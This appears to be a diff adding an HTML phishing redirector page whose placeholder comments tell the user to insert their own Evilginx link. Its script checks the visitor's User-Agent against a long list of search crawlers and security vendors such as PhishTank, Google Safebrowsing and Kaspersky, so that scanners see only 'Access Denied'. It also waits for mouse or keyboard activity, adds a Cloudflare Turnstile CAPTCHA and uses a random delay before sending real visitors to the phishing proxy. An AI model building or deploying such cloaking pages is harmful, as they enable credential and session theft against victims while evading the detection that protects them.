@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <script type="text/javascript">
+        // List of known bot User-Agents
+        const botUserAgents = ["bot", "crawler", "spider", "scraper", "wget", "curl", "Java/", "python-requests", "libwww-perl", "PycURL", "PHP", "SQLmap", "HTTrack", "Mediapartners-Google", "Bingbot", "Googlebot", "DuckDuckBot", "Yahoo! Slurp", "FacebookExternalHit", "Twitterbot", "Slackbot", "AhrefsBot", "SemrushBot", "Moz", "LinkpadBot", "Screaming Frog SEO Spider", "Netcraft Survey", "Nutch", "PiplBot", "Baiduspider", "YandexBot", "Sogou Spider", "Exabot", "Rambler", "TurnitinBot", "BingPreview", "MJ12bot", "CoccocBot", "SearchmetricsBot", "Ezooms", "Yeti", "Moodle", "Bot*", "Bing*", "Google*", "DuckDuckGo*", "Yahoo*", "facebook*", "twitter*", "slack*", "ahrefs*", "semrush*", "mozz*", "linkpad*", "screamingfrog*", "netcraft*", "nutch*", "pipl*", "baiduspider*", "yandexbot*", "sogou*", "exabot*", "rambler*", "turnitin*", "bingpreview*", "mj12bot*", "coccoc*", "searchmetrics*", "ezooms*", "yeti*", "moodle*", "Google Safebrowsing", "Phishing", "Abusix", "Acronis", "ADMINUSLabs", "AILabs (MONITORAPP)", "AlienVault", "alphaMountain.ai", "Antiy-AVL", "benkow.cc", "BitDefender", "Blueliv", "Certego", "Chong Lua Dao", "CINS Army", "CMC Threat Intelligence", "CRDF", "Criminal IP", "Cyble", "CyRadar", "desenmascara.me", "DNS8", "Dr.Web", "EmergingThreats", "Emsisoft", "ESET", "Fortinet", "GreenSnow", "IPsum", "Lionic", "MalwarePatrol", "OpenPhish", "Phishtank", "Quick Heal", "Scantitan", "Security vendors' analysis", "G-Data", "Heimdal Security", "Juniper Networks", "Lionic", "Malwared", "MalwarePatrol", "malwares.com URL checker", "OpenPhish", "Phishing Database", "Phishtank", "PREBYTES", "Quick Heal", "Quttera", "Scantitan", "SCUMWARE.org", "Seclookup", "Snort IP sample list", "Sucuri SiteCheck", "Threatsourcing", "URLhaus", "ViriBack", "Webroot", "AlphaSOC", "ZeroCERT", "AutoShun", "Bfore.Ai PreCrime", "Cluster25", "Cyan", "Forcepoint ThreatSeeker", "Gridinsoft", "Kaspersky", "MalwareURL", "PhishFort", "PrecisionSec", "Sansec eComscan", "Segasec", "Underworld", "VIPRE", "ZeroFox", "zvelo", "Xcitium Verdict Cloud", "URLQuery", "SOCRadar", "SecureBrain", "SafeToOpen", "PhishLabs", "Netcraft", "Lumu", "Hunt.io Intelligence", "GCP Abuse Intelligence", "Ermes", "CSIS Security Group", "Bkav", "Axur", "ArcSight Threat Intelligence", "0xSI_f33d", "Yandex Safebrowsing", "VX Vault", "Viettel Threat Intelligence", "Trustwave", "ThreatHive", "StopForumSpam", "Sophos", "securolytics", "SCUMWARE.org", "Quttera", "PREBYTES", "malwares.com URL checker", "Malwared", "Juniper Networks", "Heimdal Security", "G-Data", "ESTsecurity", "Emsisoft", "Dr.Web", "desenmascara.me", "Cyble", "CRDF", "CINS Army", "BitDefender", "Antiy-AVL", "AlienVault", "ADMINUSLabs", "Abusix"]
+;
+        
+        // Function to check if the User-Agent is a bot
+        function isBot(userAgent) {
+            return botUserAgents.some(bot => userAgent.includes(bot));
+        }
+
+        // Function to check if the user has interacted with the page
+        let userInteracted = false;
+        document.onmousemove = document.onkeypress = function() {
+            userInteracted = true;
+        };
+
+        // Function to add Cloudflare Turnstile CAPTCHA before redirecting
+        function addTurnstileCaptcha() {
+            // Create Turnstile widget container
+            const captchaDiv = document.createElement("div");
+            captchaDiv.className = "cf-turnstile";
+            captchaDiv.setAttribute("0x4AAAAAAAiGv_80l5_ZajLl", "0x4AAAAAAAiGvw59L_v2VlclGpyKUIalcoo"); // Replace with your actual site key
+            document.body.appendChild(captchaDiv);
+
+            // Load Turnstile script
+            const script = document.createElement("script");
+            script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js";
+            script.async = true;
+            script.defer = true;
+            document.head.appendChild(script);
+
+            // Add a submit button
+            const submitButton = document.createElement("button");
+            submitButton.innerHTML = "Submit";
+            submitButton.onclick = function() {
+                // Here you might need to verify the Turnstile token server-side before redirecting
+                window.location.href = "https://yourevilginxlink.com"; // Replace with your actual Evilginx link
+            };
+            document.body.appendChild(submitButton);
+        }
+
+        // Main logic for redirect
+        setTimeout(function() {
+            if (!isBot(navigator.userAgent) && userInteracted) {
+                // User is not a bot and has interacted with the page
+                window.location.href = "https://yourevilginxlink.com"; // Replace with your actual Evilginx link
+            } else if (!userInteracted) {
+                // User hasn't interacted, add CAPTCHA to ensure it's a human
+                addTurnstileCaptcha();
+            } else {
+                // Bot detected or no interaction
+                document.write("Access Denied");
+            }
+        }, Math.floor(Math.random() * 2000) + 1000); // Random delay between 1-3 seconds
+    </script>
+</head>
+<body>
+    <p>If you are not redirected automatically, <a href="https://yourevilginxlink.com">click here</a>.</p> <!-- Replace with your actual Evilginx link -->
+</body>
+</html>
